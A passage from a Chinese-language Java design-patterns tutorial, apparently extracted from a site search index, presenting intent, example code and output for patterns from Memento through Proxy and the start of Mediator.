访问本备忘录的内部状态。  \nImplementation    以下实现了一个简单计算器程序，可以输入两个值，然后计算这两个值的和。备忘录模式允许将这两个值存储起来，然后在某个时刻用存储的状态进行恢复。\n实现参考：Memento Pattern - Calculator Example - Java Sourcecode\n/** * Originator Interface */ public interface Calculator { // Create Memento  PreviousCalculationToCareTaker backupLastCalculation(); // setMemento  void restorePreviousCalculation(PreviousCalculationToCareTaker memento); int getCalculationResult(); void setFirstNumber(int firstNumber); void setSecondNumber(int secondNumber); } /** * Originator Implementation */ public class CalculatorImp implements Calculator { private int firstNumber; private int secondNumber; @Override public PreviousCalculationToCareTaker backupLastCalculation() { // create a memento object used for restoring two numbers  return new PreviousCalculationImp(firstNumber, secondNumber); } @Override public void restorePreviousCalculation(PreviousCalculationToCareTaker memento) { this.firstNumber = ((PreviousCalculationToOriginator) memento).getFirstNumber(); this.secondNumber = ((PreviousCalculationToOriginator) memento).getSecondNumber(); } @Override public int getCalculationResult() { // result is adding two numbers  return firstNumber + secondNumber; } @Override public void setFirstNumber(int firstNumber) { this.firstNumber = firstNumber; } @Override public void setSecondNumber(int secondNumber) { this.secondNumber = secondNumber; } } /** * Memento Interface to Originator * * This interface allows the originator to restore its state */ public interface PreviousCalculationToOriginator { int getFirstNumber(); int getSecondNumber(); } /** * Memento interface to CalculatorOperator (Caretaker) */ public interface PreviousCalculationToCareTaker { // no operations permitted for the caretaker } /** * Memento Object Implementation * \u0026lt;p\u0026gt; * Note that this object implements both interfaces to Originator and CareTaker */ public class PreviousCalculationImp implements PreviousCalculationToCareTaker, PreviousCalculationToOriginator { private int firstNumber; private int secondNumber; public PreviousCalculationImp(int firstNumber, int secondNumber) { this.firstNumber = firstNumber; this.secondNumber = secondNumber; } @Override public int getFirstNumber() { return firstNumber; } @Override public int getSecondNumber() { return secondNumber; } } /** * CareTaker object */ public class Client { public static void main(String[] args) { // program starts  Calculator calculator = new CalculatorImp(); // assume user enters two numbers  calculator.setFirstNumber(10); calculator.setSecondNumber(100); // find result  System.out.println(calculator.getCalculationResult()); // Store result of this calculation in case of error  PreviousCalculationToCareTaker memento = calculator.backupLastCalculation(); // user enters a number  calculator.setFirstNumber(17); // user enters a wrong second number and calculates result  calculator.setSecondNumber(-290); // calculate result  System.out.println(calculator.getCalculationResult()); // user hits CTRL + Z to undo last operation and see last result  calculator.restorePreviousCalculation(memento); // result restored  System.out.println(calculator.getCalculationResult()); } } 110 -273 110 JDK     java.io.Serializable  7. 观察者（Observer）    Intent    定义对象之间的一对多依赖，当一个对象状态改变时，它的所有依赖都会收到通知并且自动更新状态。\n主题（Subject）是被观察的对象，而其所有依赖者（Observer）称为观察者。\n\nClass Diagram    主题（Subject）具有注册和移除观察者、并通知所有观察者的功能，主题是通过维护一张观察者列表来实现这些操作的。\n观察者（Observer）的注册功能需要调用主题的 registerObserver() 方法。\n\nImplementation    天气数据布告板会在天气信息发生改变时更新其内容，布告板有多个，并且在将来会继续增加。\n\npublic interface Subject { void registerObserver(Observer o); void removeObserver(Observer o); void notifyObserver(); } public class WeatherData implements Subject { private List\u0026lt;Observer\u0026gt; observers; private float temperature; private float humidity; private float pressure; public WeatherData() { observers = new ArrayList\u0026lt;\u0026gt;(); } public void setMeasurements(float temperature, float humidity, float pressure) { this.temperature = temperature; this.humidity = humidity; this.pressure = pressure; notifyObserver(); } @Override public void registerObserver(Observer o) { observers.add(o); } @Override public void removeObserver(Observer o) { int i = observers.indexOf(o); if (i \u0026gt;= 0) { observers.remove(i); } } @Override public void notifyObserver() { for (Observer o : observers) { o.update(temperature, humidity, pressure); } } } public interface Observer { void update(float temp, float humidity, float pressure); } public class StatisticsDisplay implements Observer { public StatisticsDisplay(Subject weatherData) { weatherData.reisterObserver(this); } @Override public void update(float temp, float humidity, float pressure) { System.out.println(\u0026#34;StatisticsDisplay.update: \u0026#34; + temp + \u0026#34; \u0026#34; + humidity + \u0026#34; \u0026#34; + pressure); } } public class CurrentConditionsDisplay implements Observer { public CurrentConditionsDisplay(Subject weatherData) { weatherData.registerObserver(this); } @Override public void update(float temp, float humidity, float pressure) { System.out.println(\u0026#34;CurrentConditionsDisplay.update: \u0026#34; + temp + \u0026#34; \u0026#34; + humidity + \u0026#34; \u0026#34; + pressure); } } public class WeatherStation { public static void main(String[] args) { WeatherData weatherData = new WeatherData(); CurrentConditionsDisplay currentConditionsDisplay = new CurrentConditionsDisplay(weatherData); StatisticsDisplay statisticsDisplay = new StatisticsDisplay(weatherData); weatherData.setMeasurements(0, 0, 0); weatherData.setMeasurements(1, 1, 1); } } CurrentConditionsDisplay.update: 0.0 0.0 0.0 StatisticsDisplay.update: 0.0 0.0 0.0 CurrentConditionsDisplay.update: 1.0 1.0 1.0 StatisticsDisplay.update: 1.0 1.0 1.0 JDK     java.util.Observer java.util.EventListener javax.servlet.http.HttpSessionBindingListener RxJava  8. 状态（State）    Intent    允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它所属的类。\nClass Diagram    \nImplementation    糖果销售机有多种状态，每种状态下销售机有不同的行为，状态可以发生转移，使得销售机的行为也发生改变。\n\npublic interface State { /** * 投入 25 分钱 */ void insertQuarter(); /** * 退回 25 分钱 */ void ejectQuarter(); /** * 转动曲柄 */ void turnCrank(); /** * 发放糖果 */ void dispense(); } public class HasQuarterState implements State { private GumballMachine gumballMachine; public HasQuarterState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println(\u0026#34;You can\u0026#39;t insert another quarter\u0026#34;); } @Override public void ejectQuarter() { System.out.println(\u0026#34;Quarter returned\u0026#34;); gumballMachine.setState(gumballMachine.getNoQuarterState()); } @Override public void turnCrank() { System.out.println(\u0026#34;You turned...\u0026#34;); gumballMachine.setState(gumballMachine.getSoldState()); } @Override public void dispense() { System.out.println(\u0026#34;No gumball dispensed\u0026#34;); } } public class NoQuarterState implements State { GumballMachine gumballMachine; public NoQuarterState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println(\u0026#34;You insert a quarter\u0026#34;); gumballMachine.setState(gumballMachine.getHasQuarterState()); } @Override public void ejectQuarter() { System.out.println(\u0026#34;You haven\u0026#39;t insert a quarter\u0026#34;); } @Override public void turnCrank() { System.out.println(\u0026#34;You turned, but there\u0026#39;s no quarter\u0026#34;); } @Override public void dispense() { System.out.println(\u0026#34;You need to pay first\u0026#34;); } } public class SoldOutState implements State { GumballMachine gumballMachine; public SoldOutState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println(\u0026#34;You can\u0026#39;t insert a quarter, the machine is sold out\u0026#34;); } @Override public void ejectQuarter() { System.out.println(\u0026#34;You can\u0026#39;t eject, you haven\u0026#39;t inserted a quarter yet\u0026#34;); } @Override public void turnCrank() { System.out.println(\u0026#34;You turned, but there are no gumballs\u0026#34;); } @Override public void dispense() { System.out.println(\u0026#34;No gumball dispensed\u0026#34;); } } public class SoldState implements State { GumballMachine gumballMachine; public SoldState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println(\u0026#34;Please wait, we\u0026#39;re already giving you a gumball\u0026#34;); } @Override public void ejectQuarter() { System.out.println(\u0026#34;Sorry, you already turned the crank\u0026#34;); } @Override public void turnCrank() { System.out.println(\u0026#34;Turning twice doesn\u0026#39;t get you another gumball!\u0026#34;); } @Override public void dispense() { gumballMachine.releaseBall(); if (gumballMachine.getCount() \u0026gt; 0) { gumballMachine.setState(gumballMachine.getNoQuarterState()); } else { System.out.println(\u0026#34;Oops, out of gumballs\u0026#34;); gumballMachine.setState(gumballMachine.getSoldOutState()); } } } public class GumballMachine { private State soldOutState; private State noQuarterState; private State hasQuarterState; private State soldState; private State state; private int count = 0; public GumballMachine(int numberGumballs) { count = numberGumballs; soldOutState = new SoldOutState(this); noQuarterState = new NoQuarterState(this); hasQuarterState = new HasQuarterState(this); soldState = new SoldState(this); if (numberGumballs \u0026gt; 0) { state = noQuarterState; } else { state = soldOutState; } } public void insertQuarter() { state.insertQuarter(); } public void ejectQuarter() { state.ejectQuarter(); } public void turnCrank() { state.turnCrank(); state.dispense(); } public void setState(State state) { this.state = state; } public void releaseBall() { System.out.println(\u0026#34;A gumball comes rolling out the slot...\u0026#34;); if (count != 0) { count -= 1; } } public State getSoldOutState() { return soldOutState; } public State getNoQuarterState() { return noQuarterState; } public State getHasQuarterState() { return hasQuarterState; } public State getSoldState() { return soldState; } public int getCount() { return count; } } public class Client { public static void main(String[] args) { GumballMachine gumballMachine = new GumballMachine(5); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.ejectQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.ejectQuarter(); gumballMachine.insertQuarter(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); } } You insert a quarter You turned... A gumball comes rolling out the slot... You insert a quarter Quarter returned You turned, but there\u0026#39;s no quarter You need to pay first You insert a quarter You turned... A gumball comes rolling out the slot... You insert a quarter You turned... A gumball comes rolling out the slot... You haven\u0026#39;t insert a quarter You insert a quarter You can\u0026#39;t insert another quarter You turned... A gumball comes rolling out the slot... You insert a quarter You turned... A gumball comes rolling out the slot... Oops, out of gumballs You can\u0026#39;t insert a quarter, the machine is sold out You turned, but there are no gumballs No gumball dispensed 9. 策略（Strategy）    Intent    定义一系列算法，封装每个算法，并使它们可以互换。\n策略模式可以让算法独立于使用它的客户端。\nClass Diagram     Strategy 接口定义了一个算法族，它们都实现了 behavior() 方法。 Context 是使用到该算法族的类，其中的 doSomething() 方法会调用 behavior()，setStrategy(Strategy) 方法可以动态地改变 strategy 对象，也就是说能动态地改变 Context 所使用的算法。  \n与状态模式的比较    状态模式的类图和策略模式类似，并且都是能够动态改变对象的行为。但是状态模式是通过状态转移来改变 Context 所组合的 State 对象，而策略模式是通过 Context 本身的决策来改变组合的 Strategy 对象。所谓的状态转移，是指 Context 在运行过程中由于一些条件发生改变而使得 State 对象发生改变，注意必须要是在运行过程中。\n状态模式主要是用来解决状态转移的问题，当状态发生转移了，那么 Context 对象就会改变它的行为；而策略模式主要是用来封装一组可以互相替代的算法族，并且可以根据需要动态地去替换 Context 使用的算法。\nImplementation    设计一个鸭子，它可以动态地改变叫声。这里的算法族是鸭子的叫声行为。\npublic interface QuackBehavior { void quack(); } public class Quack implements QuackBehavior { @Override public void quack() { System.out.println(\u0026#34;quack!\u0026#34;); } } public class Squeak implements QuackBehavior{ @Override public void quack() { System.out.println(\u0026#34;squeak!\u0026#34;); } } public class Duck { private QuackBehavior quackBehavior; public void performQuack() { if (quackBehavior != null) { quackBehavior.quack(); } } public void setQuackBehavior(QuackBehavior quackBehavior) { this.quackBehavior = quackBehavior; } } public class Client { public static void main(String[] args) { Duck duck = new Duck(); duck.setQuackBehavior(new Squeak()); duck.performQuack(); duck.setQuackBehavior(new Quack()); duck.performQuack(); } } squeak! quack! JDK     java.util.Comparator#compare() javax.servlet.http.HttpServlet javax.servlet.Filter#doFilter()  10. 模板方法（Template Method）    Intent    定义算法框架，并将一些步骤的实现延迟到子类。\n通过模板方法，子类可以重新定义算法的某些步骤，而不用改变算法的结构。\nClass Diagram    \nImplementation    冲咖啡和冲茶都有类似的流程，但是某些步骤会有点不一样，要求复用那些相同步骤的代码。\n\npublic abstract class CaffeineBeverage { final void prepareRecipe() { boilWater(); brew(); pourInCup(); addCondiments(); } abstract void brew(); abstract void addCondiments(); void boilWater() { System.out.println(\u0026#34;boilWater\u0026#34;); } void pourInCup() { System.out.println(\u0026#34;pourInCup\u0026#34;); } } public class Coffee extends CaffeineBeverage { @Override void brew() { System.out.println(\u0026#34;Coffee.brew\u0026#34;); } @Override void addCondiments() { System.out.println(\u0026#34;Coffee.addCondiments\u0026#34;); } } public class Tea extends CaffeineBeverage { @Override void brew() { System.out.println(\u0026#34;Tea.brew\u0026#34;); } @Override void addCondiments() { System.out.println(\u0026#34;Tea.addCondiments\u0026#34;); } } public class Client { public static void main(String[] args) { CaffeineBeverage caffeineBeverage = new Coffee(); caffeineBeverage.prepareRecipe(); System.out.println(\u0026#34;-----------\u0026#34;); caffeineBeverage = new Tea(); caffeineBeverage.prepareRecipe(); } } boilWater Coffee.brew pourInCup Coffee.addCondiments ----------- boilWater Tea.brew pourInCup Tea.addCondiments JDK     java.util.Collections#sort() java.io.InputStream#skip() java.io.InputStream#read() java.util.AbstractList#indexOf()  11. 访问者（Visitor）    Intent    为一个对象结构（比如组合结构）增加新能力。\nClass Diagram     Visitor：访问者，为每一个 ConcreteElement 声明一个 visit 操作 ConcreteVisitor：具体访问者，存储遍历过程中的累计结果 ObjectStructure：对象结构，可以是组合结构，或者是一个集合。  \nImplementation    public interface Element { void accept(Visitor visitor); } class CustomerGroup { private List\u0026lt;Customer\u0026gt; customers = new ArrayList\u0026lt;\u0026gt;(); void accept(Visitor visitor) { for (Customer customer : customers) { customer.accept(visitor); } } void addCustomer(Customer customer) { customers.add(customer); } } public class Customer implements Element { private String name; private List\u0026lt;Order\u0026gt; orders = new ArrayList\u0026lt;\u0026gt;(); Customer(String name) { this.name = name; } String getName() { return name; } void addOrder(Order order) { orders.add(order); } public void accept(Visitor visitor) { visitor.visit(this); for (Order order : orders) { order.accept(visitor); } } } public class Order implements Element { private String name; private List\u0026lt;Item\u0026gt; items = new ArrayList(); Order(String name) { this.name = name; } Order(String name, String itemName) { this.name = name; this.addItem(new Item(itemName)); } String getName() { return name; } void addItem(Item item) { items.add(item); } public void accept(Visitor visitor) { visitor.visit(this); for (Item item : items) { item.accept(visitor); } } } public class Item implements Element { private String name; Item(String name) { this.name = name; } String getName() { return name; } public void accept(Visitor visitor) { visitor.visit(this); } } public interface Visitor { void visit(Customer customer); void visit(Order order); void visit(Item item); } public class GeneralReport implements Visitor { private int customersNo; private int ordersNo; private int itemsNo; public void visit(Customer customer) { System.out.println(customer.getName()); customersNo++; } public void visit(Order order) { System.out.println(order.getName()); ordersNo++; } public void visit(Item item) { System.out.println(item.getName()); itemsNo++; } public void displayResults() { System.out.println(\u0026#34;Number of customers: \u0026#34; + customersNo); System.out.println(\u0026#34;Number of orders: \u0026#34; + ordersNo); System.out.println(\u0026#34;Number of items: \u0026#34; + itemsNo); } } public class Client { public static void main(String[] args) { Customer customer1 = new Customer(\u0026#34;customer1\u0026#34;); customer1.addOrder(new Order(\u0026#34;order1\u0026#34;, \u0026#34;item1\u0026#34;)); customer1.addOrder(new Order(\u0026#34;order2\u0026#34;, \u0026#34;item1\u0026#34;)); customer1.addOrder(new Order(\u0026#34;order3\u0026#34;, \u0026#34;item1\u0026#34;)); Order order = new Order(\u0026#34;order_a\u0026#34;); order.addItem(new Item(\u0026#34;item_a1\u0026#34;)); order.addItem(new Item(\u0026#34;item_a2\u0026#34;)); order.addItem(new Item(\u0026#34;item_a3\u0026#34;)); Customer customer2 = new Customer(\u0026#34;customer2\u0026#34;); customer2.addOrder(order); CustomerGroup customers = new CustomerGroup(); customers.addCustomer(customer1); customers.addCustomer(customer2); GeneralReport visitor = new GeneralReport(); customers.accept(visitor); visitor.displayResults(); } } customer1 order1 item1 order2 item1 order3 item1 customer2 order_a item_a1 item_a2 item_a3 Number of customers: 2 Number of orders: 4 Number of items: 6 JDK     javax.lang.model.element.Element and javax.lang.model.element.ElementVisitor javax.lang.model.type.TypeMirror and javax.lang.model.type.TypeVisitor  12. 空对象（Null）    Intent    使用什么都不做的空对象来代替 NULL。\n一个方法返回 NULL，意味着方法的调用端需要去检查返回值是否是 NULL，这么做会导致非常多的冗余的检查代码。并且如果某一个调用端忘记了做这个检查返回值，而直接使用返回的对象，那么就有可能抛出空指针异常。\nClass Diagram    \nImplementation    public abstract class AbstractOperation { abstract void request(); } public class RealOperation extends AbstractOperation { @Override void request() { System.out.println(\u0026#34;do something\u0026#34;); } } public class NullOperation extends AbstractOperation{ @Override void request() { // do nothing  } } public class Client { public static void main(String[] args) { AbstractOperation abstractOperation = func(-1); abstractOperation.request(); } public static AbstractOperation func(int para) { if (para \u0026lt; 0) { return new NullOperation(); } return new RealOperation(); } } 四、结构型    1. 适配器（Adapter）    Intent    把一个类接口转换成另一个用户需要的接口。\n\nClass Diagram    \nImplementation    鸭子（Duck）和火鸡（Turkey）拥有不同的叫声，Duck 的叫声调用 quack() 方法，而 Turkey 调用 gobble() 方法。\n要求将 Turkey 的 gobble() 方法适配成 Duck 的 quack() 方法，从而让火鸡冒充鸭子！\npublic interface Duck { void quack(); } public interface Turkey { void gobble(); } public class WildTurkey implements Turkey { @Override public void gobble() { System.out.println(\u0026#34;gobble!\u0026#34;); } } public class TurkeyAdapter implements Duck { Turkey turkey; public TurkeyAdapter(Turkey turkey) { this.turkey = turkey; } @Override public void quack() { turkey.gobble(); } } public class Client { public static void main(String[] args) { Turkey turkey = new WildTurkey(); Duck duck = new TurkeyAdapter(turkey); duck.quack(); } } JDK     java.util.Arrays#asList() java.util.Collections#list() java.util.Collections#enumeration() javax.xml.bind.annotation.adapters.XMLAdapter  2. 桥接（Bridge）    Intent    将抽象与实现分离开来，使它们可以独立变化。\nClass Diagram     Abstraction：定义抽象类的接口 Implementor：定义实现类接口  \nImplementation    RemoteControl 表示遥控器，指代 Abstraction。\nTV 表示电视，指代 Implementor。\n桥接模式将遥控器和电视分离开来，从而可以独立改变遥控器或者电视的实现。\npublic abstract class TV { public abstract void on(); public abstract void off(); public abstract void tuneChannel(); } public class Sony extends TV { @Override public void on() { System.out.println(\u0026#34;Sony.on()\u0026#34;); } @Override public void off() { System.out.println(\u0026#34;Sony.off()\u0026#34;); } @Override public void tuneChannel() { System.out.println(\u0026#34;Sony.tuneChannel()\u0026#34;); } } public class RCA extends TV { @Override public void on() { System.out.println(\u0026#34;RCA.on()\u0026#34;); } @Override public void off() { System.out.println(\u0026#34;RCA.off()\u0026#34;); } @Override public void tuneChannel() { System.out.println(\u0026#34;RCA.tuneChannel()\u0026#34;); } } public abstract class RemoteControl { protected TV tv; public RemoteControl(TV tv) { this.tv = tv; } public abstract void on(); public abstract void off(); public abstract void tuneChannel(); } public class ConcreteRemoteControl1 extends RemoteControl { public ConcreteRemoteControl1(TV tv) { super(tv); } @Override public void on() { System.out.println(\u0026#34;ConcreteRemoteControl1.on()\u0026#34;); tv.on(); } @Override public void off() { System.out.println(\u0026#34;ConcreteRemoteControl1.off()\u0026#34;); tv.off(); } @Override public void tuneChannel() { System.out.println(\u0026#34;ConcreteRemoteControl1.tuneChannel()\u0026#34;); tv.tuneChannel(); } } public class ConcreteRemoteControl2 extends RemoteControl { public ConcreteRemoteControl2(TV tv) { super(tv); } @Override public void on() { System.out.println(\u0026#34;ConcreteRemoteControl2.on()\u0026#34;); tv.on(); } @Override public void off() { System.out.println(\u0026#34;ConcreteRemoteControl2.off()\u0026#34;); tv.off(); } @Override public void tuneChannel() { System.out.println(\u0026#34;ConcreteRemoteControl2.tuneChannel()\u0026#34;); tv.tuneChannel(); } } public class Client { public static void main(String[] args) { RemoteControl remoteControl1 = new ConcreteRemoteControl1(new RCA()); remoteControl1.on(); remoteControl1.off(); remoteControl1.tuneChannel(); RemoteControl remoteControl2 = new ConcreteRemoteControl2(new Sony()); remoteControl2.on(); remoteControl2.off(); remoteControl2.tuneChannel(); } } JDK     AWT (It provides an abstraction layer which maps onto the native OS the windowing support.) JDBC  3. 组合（Composite）    Intent    将对象组合成树形结构来表示“整体/部分”层次关系，允许用户以相同的方式处理单独对象和组合对象。\nClass Diagram    组件（Component）类是组合类（Composite）和叶子类（Leaf）的父类，可以把组合类看成是树的中间节点。\n组合对象拥有一个或者多个组件对象，因此组合对象的操作可以委托给组件对象去处理，而组件对象可以是另一个组合对象或者叶子对象。\n\nImplementation    public abstract class Component { protected String name; public Component(String name) { this.name = name; } public void print() { print(0); } abstract void print(int level); abstract public void add(Component component); abstract public void remove(Component component); } public class Composite extends Component { private List\u0026lt;Component\u0026gt; child; public Composite(String name) { super(name); child = new ArrayList\u0026lt;\u0026gt;(); } @Override void print(int level) { for (int i = 0; i \u0026lt; level; i++) { System.out.print(\u0026#34;--\u0026#34;); } System.out.println(\u0026#34;Composite:\u0026#34; + name); for (Component component : child) { component.print(level + 1); } } @Override public void add(Component component) { child.add(component); } @Override public void remove(Component component) { child.remove(component); } } public class Leaf extends Component { public Leaf(String name) { super(name); } @Override void print(int level) { for (int i = 0; i \u0026lt; level; i++) { System.out.print(\u0026#34;--\u0026#34;); } System.out.println(\u0026#34;left:\u0026#34; + name); } @Override public void add(Component component) { throw new UnsupportedOperationException(); // 牺牲透明性换取单一职责原则，这样就不用考虑是叶子节点还是组合节点  } @Override public void remove(Component component) { throw new UnsupportedOperationException(); } } public class Client { public static void main(String[] args) { Composite root = new Composite(\u0026#34;root\u0026#34;); Component node1 = new Leaf(\u0026#34;1\u0026#34;); Component node2 = new Composite(\u0026#34;2\u0026#34;); Component node3 = new Leaf(\u0026#34;3\u0026#34;); root.add(node1); root.add(node2); root.add(node3); Component node21 = new Leaf(\u0026#34;21\u0026#34;); Component node22 = new Composite(\u0026#34;22\u0026#34;); node2.add(node21); node2.add(node22); Component node221 = new Leaf(\u0026#34;221\u0026#34;); node22.add(node221); root.print(); } } Composite:root --left:1 --Composite:2 ----left:21 ----Composite:22 ------left:221 --left:3 JDK     javax.swing.JComponent#add(Component) java.awt.Container#add(Component) java.util.Map#putAll(Map) java.util.List#addAll(Collection) java.util.Set#addAll(Collection)  4. 装饰（Decorator）    Intent    为对象动态添加功能。\nClass Diagram    装饰者（Decorator）和具体组件（ConcreteComponent）都继承自组件（Component），具体组件的方法实现不需要依赖于其它对象，而装饰者组合了一个组件，这样它可以装饰其它装饰者或者具体组件。所谓装饰，就是把这个装饰者套在被装饰者之上，从而动态扩展被装饰者的功能。装饰者的方法有一部分是自己的，这属于它的功能，然后调用被装饰者的方法实现，从而也保留了被装饰者的功能。可以看到，具体组件应当是装饰层次的最低层，因为只有具体组件的方法实现不需要依赖于其它对象。\n\nImplementation    设计不同种类的饮料，饮料可以添加配料，比如可以添加牛奶，并且支持动态添加新配料。每增加一种配料，该饮料的价格就会增加，要求计算一种饮料的价格。\n下图表示在 DarkRoast 饮料上新增新添加 Mocha 配料，之后又添加了 Whip 配料。DarkRoast 被 Mocha 包裹，Mocha 又被 Whip 包裹。它们都继承自相同父类，都有 cost() 方法，外层类的 cost() 方法调用了内层类的 cost() 方法。\n\npublic interface Beverage { double cost(); } public class DarkRoast implements Beverage { @Override public double cost() { return 1; } } public class HouseBlend implements Beverage { @Override public double cost() { return 1; } } public abstract class CondimentDecorator implements Beverage { protected Beverage beverage; } public class Milk extends CondimentDecorator { public Milk(Beverage beverage) { this.beverage = beverage; } @Override public double cost() { return 1 + beverage.cost(); } } public class Mocha extends CondimentDecorator { public Mocha(Beverage beverage) { this.beverage = beverage; } @Override public double cost() { return 1 + beverage.cost(); } } public class Client { public static void main(String[] args) { Beverage beverage = new HouseBlend(); beverage = new Mocha(beverage); beverage = new Milk(beverage); System.out.println(beverage.cost()); } } 3.0 设计原则    类应该对扩展开放，对修改关闭：也就是添加新功能时不需要修改代码。饮料可以动态添加新的配料，而不需要去修改饮料的代码。\n不可能把所有的类设计成都满足这一原则，应当把该原则应用于最有可能发生改变的地方。\nJDK     java.io.BufferedInputStream(InputStream) java.io.DataInputStream(InputStream) java.io.BufferedOutputStream(OutputStream) java.util.zip.ZipOutputStream(OutputStream) java.util.Collections#checkedList|Map|Set|SortedSet|SortedMap  5. 外观（Facade）    Intent    提供了一个统一的接口，用来访问子系统中的一群接口，从而让子系统更容易使用。\nClass Diagram    \nImplementation    观看电影需要操作很多电器，使用外观模式实现一键看电影功能。\npublic class SubSystem { public void turnOnTV() { System.out.println(\u0026#34;turnOnTV()\u0026#34;); } public void setCD(String cd) { System.out.println(\u0026#34;setCD( \u0026#34; + cd + \u0026#34; )\u0026#34;); } public void startWatching(){ System.out.println(\u0026#34;startWatching()\u0026#34;); } } public class Facade { private SubSystem subSystem = new SubSystem(); public void watchMovie() { subSystem.turnOnTV(); subSystem.setCD(\u0026#34;a movie\u0026#34;); subSystem.startWatching(); } } public class Client { public static void main(String[] args) { Facade facade = new Facade(); facade.watchMovie(); } } 设计原则    最少知识原则：只和你的密友谈话。也就是说客户对象所需要交互的对象应当尽可能少。\n6. 享元（Flyweight）    Intent    利用共享的方式来支持大量细粒度的对象，这些对象一部分内部状态是相同的。\nClass Diagram     Flyweight：享元对象 IntrinsicState：内部状态，享元对象共享内部状态 ExtrinsicState：外部状态，每个享元对象的外部状态不同  \nImplementation    public interface Flyweight { void doOperation(String extrinsicState); } public class ConcreteFlyweight implements Flyweight { private String intrinsicState; public ConcreteFlyweight(String intrinsicState) { this.intrinsicState = intrinsicState; } @Override public void doOperation(String extrinsicState) { System.out.println(\u0026#34;Object address: \u0026#34; + System.identityHashCode(this)); System.out.println(\u0026#34;IntrinsicState: \u0026#34; + intrinsicState); System.out.println(\u0026#34;ExtrinsicState: \u0026#34; + extrinsicState); } } public class FlyweightFactory { private HashMap\u0026lt;String, Flyweight\u0026gt; flyweights = new HashMap\u0026lt;\u0026gt;(); Flyweight getFlyweight(String intrinsicState) { if (!flyweights.containsKey(intrinsicState)) { Flyweight flyweight = new ConcreteFlyweight(intrinsicState); flyweights.put(intrinsicState, flyweight); } return flyweights.get(intrinsicState); } } public class Client { public static void main(String[] args) { FlyweightFactory factory = new FlyweightFactory(); Flyweight flyweight1 = factory.getFlyweight(\u0026#34;aa\u0026#34;); Flyweight flyweight2 = factory.getFlyweight(\u0026#34;aa\u0026#34;); flyweight1.doOperation(\u0026#34;x\u0026#34;); flyweight2.doOperation(\u0026#34;y\u0026#34;); } } Object address: 1163157884 IntrinsicState: aa ExtrinsicState: x Object address: 1163157884 IntrinsicState: aa ExtrinsicState: y JDK    Java 利用缓存来加速大量小对象的访问时间。\n java.lang.Integer#valueOf(int) java.lang.Boolean#valueOf(boolean) java.lang.Byte#valueOf(byte) java.lang.Character#valueOf(char)  7. 代理（Proxy）    Intent    控制对其它对象的访问。\nClass Diagram    代理有以下四类：\n 远程代理（Remote Proxy）：控制对远程对象（不同地址空间）的访问，它负责将请求及其参数进行编码，并向不同地址空间中的对象发送已经编码的请求。 虚拟代理（Virtual Proxy）：根据需要创建开销很大的对象，它可以缓存实体的附加信息，以便延迟对它的访问，例如在网站加载一个很大图片时，不能马上完成，可以用虚拟代理缓存图片的大小信息，然后生成一张临时图片代替原始图片。 保护代理（Protection Proxy）：按权限控制对象的访问，它负责检查调用者是否具有实现一个请求所必须的访问权限。 智能代理（Smart Reference）：取代了简单的指针，它在访问对象时执行一些附加操作：记录对象的引用次数；当第一次引用一个对象时，将它装入内存；在访问一个实际对象前，检查是否已经锁定了它，以确保其它对象不能改变它。  \nImplementation    以下是一个虚拟代理的实现，模拟了图片延迟加载的情况下使用与图片大小相等的临时内容去替换原始图片，直到图片加载完成才将图片显示出来。\npublic interface Image { void showImage(); } public class HighResolutionImage implements Image { private URL imageURL; private long startTime; private int height; private int width; public int getHeight() { return height; } public int getWidth() { return width; } public HighResolutionImage(URL imageURL) { this.imageURL = imageURL; this.startTime = System.currentTimeMillis(); this.width = 600; this.height = 600; } public boolean isLoad() { // 模拟图片加载，延迟 3s 加载完成  long endTime = System.currentTimeMillis(); return endTime - startTime \u0026gt; 3000; } @Override public void showImage() { System.out.println(\u0026#34;Real Image: \u0026#34; + imageURL); } } public class ImageProxy implements Image { private HighResolutionImage highResolutionImage; public ImageProxy(HighResolutionImage highResolutionImage) { this.highResolutionImage = highResolutionImage; } @Override public void showImage() { while (!highResolutionImage.isLoad()) { try { System.out.println(\u0026#34;Temp Image: \u0026#34; + highResolutionImage.getWidth() + \u0026#34; \u0026#34; + highResolutionImage.getHeight()); Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } } highResolutionImage.showImage(); } } public class ImageViewer { public static void main(String[] args) throws Exception { String image = \u0026#34;http://image.jpg\u0026#34;; URL url = new URL(image); HighResolutionImage highResolutionImage = new HighResolutionImage(url); ImageProxy imageProxy = new ImageProxy(highResolutionImage); imageProxy.showImage(); } } JDK     java.lang.reflect.Proxy RMI  参考资料     弗里曼. Head First 设计模式 [M]. 中国电力出版社, 2007. Gamma E. 设计模式: 可复用面向对象软件的基础 [M]. 机械工业出版社, 2007. Bloch J. Effective java[M]. Addison-Wesley Professional, 2017. Design Patterns Design patterns implemented in Java The breakdown of design patterns in JDK  "},{"id":376,"href":"/%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%B8%AD%E4%BB%8B%E8%80%85/","title":"设计模式 - 中介者","parent":"设计模式","content":"5. 中介者（Mediator）    Intent    集中相关对象之间复杂的沟通和控制方式。\nClass Diagram     Mediator：中介者，定义一个接口用于与各同事（Colleague）对象通信。 Colleague：同事，相关对象  \nImplementation    Alarm（闹钟）、CoffeePot（咖啡壶）、Calendar（日历）、Sprinkler（喷头）是一组相关的对象，在某个对象的事件产生时需要去操作其它对象，形成了下面这种依赖结构：\n\n使用中介者模式可以将复杂的依赖结构变成星形结构：\n\npublic abstract class Colleague { public abstract void onEvent(Mediator mediator); } public class Alarm extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent(\u0026#34;alarm\u0026#34;); } public void doAlarm() { 